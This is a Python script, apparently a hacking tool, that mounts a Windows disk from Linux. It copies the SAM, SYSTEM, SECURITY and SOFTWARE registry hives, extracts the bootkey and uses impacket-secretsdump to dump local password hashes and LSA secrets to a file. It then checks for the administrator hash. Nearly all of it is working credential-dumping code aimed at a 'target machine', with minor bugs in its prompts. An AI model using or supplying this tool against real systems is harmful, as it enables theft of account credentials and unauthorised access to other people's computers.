import os
import subprocess
import shutil
banner = r"""                                                                          
                                                                                       
                              █████████            ████████▓                           
                              █▓▓█▓▓▒█▒            █▓▓▒▓▓▓█                            
                             ▒█░▓█▒▒▓█░           ██▓█▓██▓█                            
                             ██▓▓▓▓▓▓█░           ██▓▓▒▓▒▓█                            
                             ██▒▒▓▒█▒█            █▓██▓▓▓██                            
                             █▒█▒▓▒███            █▒▓█▓▒▓▓█                            
                  █████████████▒▓▓█▒▓██████ ███████▓▓▒▓▓▓▓████████████                 
                  █▓░█▓█▒█▓▓▒▓▒█▒▓█▒▓▓█▒█▒█ ██▓█▒▓█▓▓▓▓▓▓▒█▓▓█▓▓▓▓▓▓█                  
                  █▓▓▓▒▓▓▓▒▓▓▓██▓▓▓▓█▓█▓▓██  ████▓▓▓▓▓█▓▓█▓▒▓████▓█▓█░                 
                  █▓▓▓▒██▒▓▓█▓▒▓▓▓▓█▓▓▓▓█▓███  ██▒█▓▓▒█▓▓█▓▒█▒▓█▓▓▒▒█                  
                 █████████████▒▓█▓▓▓██████████  ██▓▓▓█▒▓▓████████████                  
                             █▓▓▓▓▒▓█░           ▓█▓▓▒██▓█                             
                            ██▓▓█▓▓▓█░           ██▓█▓██▒█░                            
                            ██▒▓▒▒█▓█░           ███▓▒▓▓▓█                             
                            █▓█▓▓▓█▒█              ███▓▓██                             
                            ██▓█▒██▓█           █    █▓▓▓█████████████                 
                 ████████████▓▓▓▓▓▓▓█████████████ ██ ██▓▓▓█████████▓█░                 
                 █░█▒▓█▓▓▓▒▓▓█▓▓▒▒▓▓▒▓▓▓██▓▓▓▒█▒█ ██  ██▓███▒██▓▓▓███░                 
                 █▓▓▓▓█▓▓▓▓▓▓▓▓▓█▓▓█▒▓▓▓█▓▓▓▓▓▓██ ████ ██▒▓▓▓▒█▓▓▓█▓█░                 
                 ███████████▓█▓▓▓▓██████████████░ ██▓██ █████████████                  
                  ░░ ░░░   ██▒▓▓▓▓▓█░            ███░███                               
                           █▓▓█▓█▒▓█░            ██▓▓█▒██                              
                           █▓▓▓▓▒███░            █▓▓▓▒▒██▒                             
                           █▓▓▓██▓▓█             █▒▓▓██▒█░                             
                           █████████             ████████                              
                            ░░░░░  ▒             ░░░░░ ░░                              
                                                                                    

"""

print(banner)

# Defining required paths
mntpath = os.path.join(os.path.expanduser("/mnt"), "windows")
tmp = os.path.join(os.path.expanduser("/tmp"), "dump")
syspath = "/mnt/windows/Windows/System32/config/SYSTEM"
sampath = "/mnt/windows/Windows/System32/config/SAM"
securitypath = "/mnt/windows/Windows/System32/config/SECURITY"
softwarepath = "/mnt/windows/Windows/System32/config/SOFTWARE"

# Defining required variables
SOFTWARE ="/tmp/dump/SOFTWARE"
KEY = "Microsoft\\Windows NT\\CurrentVersion"

# Running bash commands with basic error handling
def run_command(command):
    try:
        result = subprocess.run(
            command,
            check=True,
            capture_output=True,
            text=True
        )
        return result.stdout.strip() or "[x]No output."
    except FileNotFoundError:
        return f"Command not found: {command[0]}"
    except subprocess.CalledProcessError as error:
        error_output = error.stderr.strip() or error.stdout.strip()
        return f"Command failed with error ({error.returncode}): {error_output}"

# Checking the presence of required binaries and directories and defining them
print("[+]Checking requirements...")

secretspath = shutil.which("impacket-secretsdump")
if secretspath is None:
     sec = input("[x]Secrets dump not found. want to install it?(y/n):")
     if sec == "y":
          subprocess.run(["sudo", "apt", "install", "-y", "impacket-scripts"],
                         check=True
            )
     else:
      exit()


hivexpath = shutil.which("hivexget")
if hivexpath is None:
     sec = input("[x]Hivex not found. want to install it?(y/n):")
     if sec == "y":
          subprocess.run(["sudo", "apt", "install", "libhivex-bin"],
                         check=True
            )
     else:
      exit()
    

if not os.path.isdir(mntpath):
     opt=input (f"[X]Mount point {mntpath} does not exist, create it? (y/n): ")
     if opt.lower() == "y":
             os.makedirs(mntpath)
     elif opt.lower(n) == "n":
          exit()
else: 
    print(f"[+]Mount point {mntpath} exists.")


if not os.path.isdir(tmp):
     opt=input (f"[x]Temporary directory {tmp} does not exist, create it? (y/n): ")
     if opt.lower() == "y":
             os.makedirs(tmp)
     elif opt.lower(n) == "n":
          exit()
else: 
    print(f"[+]Temporary directory {mntpath} exists.")

# Using fdisk -l to make manually selecting the windows partition easier
TAB = os.system("fdisk -l")
print([TAB])
PART = input("[+]Select partition: /dev/")

# Checks filesystem type to run the right driver
print(f"[+]Scanning for /dev/{PART} filesystem...")
output = subprocess.run(["lsblk", "-no", "FSTYPE", f"/dev/{PART}"], capture_output=True, text=True)
filesystem = output.stdout.strip().lower()
print(f"[+]Filesystem found: {filesystem}")
print ("[+]Mounting partition...")
if filesystem == "ntfs":
     os.system(f"sudo mount -t ntfs-3g -o ro /dev/{PART} {mntpath}")
elif filesystem == "vfat":
     os.system(f"sudo mount -t vfat -o ro /dev/{PART} {mntpath}")
elif filesystem == "exfat":
     os.system(f"sudo mount -t exfat -o ro /dev/{PART} {mntpath}")

# Copying files to a tmp folder to avoid permission issues and make it work even if windows is in hibernation
print("[+]Copying system files to temporary folder")
os.system(f"sudo cp {syspath} /tmp/dump/")
os.system(f"sudo cp {sampath} /tmp/dump/")
os.system(f"sudo cp {securitypath} /tmp/dump/")
os.system(f"sudo cp {softwarepath} /tmp/dump/")

# Extracting the bootkey, necessary for dumping the hashes and LSAS, with syntax error handling
print("[+]Extracting bootkey from SYSTEM file...")
bootkey = run_command(["sudo", secretspath, "-system", "/tmp/dump/SYSTEM", "LOCAL"])
split = bootkey.split("x")
bootkey = split[1]
bootkey = bootkey[:32]

# Core part of the tool. Dumps hashes LSAS and get OS information to find possible vulnerabilities later
print ("[+]Dumping hashes, LSA secrets and OS informations...")
outputs = [
	("SAM", ["sudo", secretspath, "-bootkey", bootkey, "-sam", "/tmp/dump/SAM", "LOCAL"]),
	("SECURITY", ["sudo", secretspath, "-bootkey", bootkey, "-security", "/tmp/dump/SECURITY", "LOCAL"]),
    ("ProductName",    ["hivexget", SOFTWARE, KEY, "ProductName"]),
    ("CurrentVersion", ["hivexget", SOFTWARE, KEY, "CurrentVersion"]),
    ("CurrentBuild",   ["hivexget", SOFTWARE, KEY, "CurrentBuild"]),
]
with open("dump.txt", "w", encoding="utf-8") as dump:
	for label, command in outputs:
		dump.write(f"{label} = {run_command(command)}\n\n")

# Unmounting the partition to avoid data corruption and possible error alerts on the target machine
print ("[+]Unmounting partition safely...")
os.system("sudo umount /mnt/windows")

# Checks if the administrator hash is present in dump.txt.
print("[*]Checking if hashes were dumped successfully...")
def hashchk():
    with open("dump.txt") as temp_f:
        datafile = temp_f.readlines()
    for line in datafile:
        if "500" in line:
            return True  
    return False  


if hashchk():
    print("[#]dump successfull")
else:
    print("[x]hashes not dumped, check dump.txt for errors")

